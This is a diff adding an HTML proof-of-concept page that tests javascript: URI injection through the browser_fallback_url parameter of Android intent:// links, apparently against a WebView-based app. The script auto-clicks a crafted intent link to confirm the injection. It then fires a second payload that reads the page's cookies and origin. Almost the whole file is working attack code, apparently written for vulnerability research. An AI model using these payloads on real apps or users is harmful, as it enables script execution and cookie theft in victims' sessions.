@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head><title>JS Injection Test</title></head>
+<body>
+<h2>browser_fallback_url javascript: injection</h2>
+<div id="r" style="font-family:monospace;white-space:pre-wrap;font-size:10px;background:#eee;padding:8px;word-break:break-all;"></div>
+<script>
+var r = document.getElementById('r');
+function log(msg) { r.textContent += msg + '\n'; }
+
+log('=== javascript: URI Injection via browser_fallback_url ===');
+log('');
+
+// Test: inject javascript: via browser_fallback_url
+// This will call webView.loadUrl("javascript:...") which executes JS in the current page context
+var jsPayload = 'javascript:void(document.title="INJECTED_JS_EXEC")';
+
+var a = document.createElement('a');
+a.href = 'intent://x/#Intent;scheme=test;S.browser_fallback_url=' + encodeURIComponent(jsPayload) + ';end';
+document.body.appendChild(a);
+
+log('[*] Created intent:// link with javascript: fallback URL');
+log('[*] Payload: ' + jsPayload);
+log('[*] Auto-clicking...');
+
+a.click();
+
+log('[*] Clicked. Checking title in 2s...');
+
+setTimeout(function() {
+  log('');
+  log('[Result] document.title = "' + document.title + '"');
+  if (document.title === 'INJECTED_JS_EXEC') {
+    log('[!!!] javascript: URI INJECTION CONFIRMED!');
+    log('[!!!] We can execute arbitrary JS via browser_fallback_url');
+    log('');
+
+    // Now test a more impactful payload - DOM manipulation
+    var a2 = document.createElement('a');
+    var payload2 = 'javascript:void(document.getElementById("r").textContent+="\\n[PAYLOAD] Injected JS running! Cookie: "+document.cookie+"\\n[PAYLOAD] Origin: "+location.origin+"\\n")';
+    a2.href = 'intent://x/#Intent;scheme=test;S.browser_fallback_url=' + encodeURIComponent(payload2) + ';end';
+    document.body.appendChild(a2);
+    a2.click();
+  } else {
+    log('[*] Title unchanged - javascript: may not have executed');
+    log('[*] This could mean loadUrl strips javascript: scheme');
+  }
+}, 2000);
+
+setTimeout(function() {
+  log('');
+  log('=== Final State ===');
+  log('document.title: ' + document.title);
+  log('Tests complete.');
+}, 4000);
+
+</script>
+</body>
+</html>
